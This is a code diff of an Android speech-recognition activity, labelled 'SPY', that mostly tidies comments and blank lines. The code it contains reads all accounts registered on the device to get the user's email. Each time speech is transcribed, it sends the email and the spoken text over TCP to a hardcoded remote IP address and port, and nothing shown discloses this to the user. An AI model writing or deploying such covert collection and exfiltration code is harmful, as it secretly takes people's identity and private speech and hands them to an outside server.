@@ -40,20 +40,18 @@ import java.util.Random;
 public class MainActivity extends Activity implements OnClickListener, OnDSListener, OnDSPermissionsListener
 {
 
-    private String TAG = "SPY";
+    //Global Variables
     String[] permissions = {"android.permission.GET_ACCOUNTS"};
+    private String TAG = "SPY";
     private String wantAccountsPermission = Manifest.permission.GET_ACCOUNTS;
-
     private DroidSpeech droidSpeech;
     private TextView finalSpeechResult;
     private ImageView start, stop;
     private Client client;
-
     private String userEmail = "";
 
+    // Constants
     private static final int PERMISSION_REQUEST_CODE = 1;
-
-    // MARK: Activity Methods
 
     @Override
     protected void onCreate(Bundle savedInstanceState)
@@ -64,7 +62,7 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
                 .permitAll().build();
         StrictMode.setThreadPolicy(policy);
 
-        // Setting the layout;[.
+        // Setting the layout
         setContentView(R.layout.activity_droid_speech);
 
         if (!checkPermission(wantAccountsPermission))
@@ -89,12 +87,9 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
         droidSpeech.setRecognitionProgressMsgColor(Color.WHITE);
         droidSpeech.setOneStepVerifyConfirmTextColor(Color.WHITE);
         droidSpeech.setOneStepVerifyRetryTextColor(Color.WHITE);
-
         finalSpeechResult = findViewById(R.id.finalSpeechResult);
-
         start = findViewById(R.id.start);
         start.setOnClickListener(this);
-
         stop = findViewById(R.id.stop);
         stop.setOnClickListener(this);
 
@@ -103,9 +98,6 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
     private void getEmails()
     {
         Pattern emailPattern = Patterns.EMAIL_ADDRESS;
-
-        // Getting all registered Google Accounts;
-        // Account[] accounts = AccountManager.get(this).getAccountsByType("com.google");
 
         // Getting all registered Accounts;
         Account[] accounts = AccountManager.get(this).getAccounts();
@@ -191,8 +183,6 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
         }
     }
 
-    // MARK: OnClickListener Method
-
     @Override
     public void onClick(View view)
     {
@@ -220,8 +210,6 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
                 break;
         }
     }
-
-    // MARK: DroidSpeechListener Methods
 
     @Override
     public void onDroidSpeechSupportedLanguages(String currentSpeechLanguage, List<String> supportedSpeechLanguages)
@@ -257,9 +245,12 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
     {
         // Setting the final speech result
         this.finalSpeechResult.setText(finalSpeechResult);
+
+        // Init TCP client
         client = new Client("167.71.154.254",9001);
         String s = userEmail +"|"+ finalSpeechResult;
 
+        // Send message to the server
         client.sendMessage(s);
         client.closeConnection();
 
@@ -302,7 +293,6 @@ public class MainActivity extends Activity implements OnClickListener, OnDSListe
         });
     }
 
-    // MARK: DroidSpeechPermissionsListener Method
 
     @Override
     public void onDroidSpeechAudioPermissionStatus(boolean audioPermissionGiven, String errorMsgIfAny)
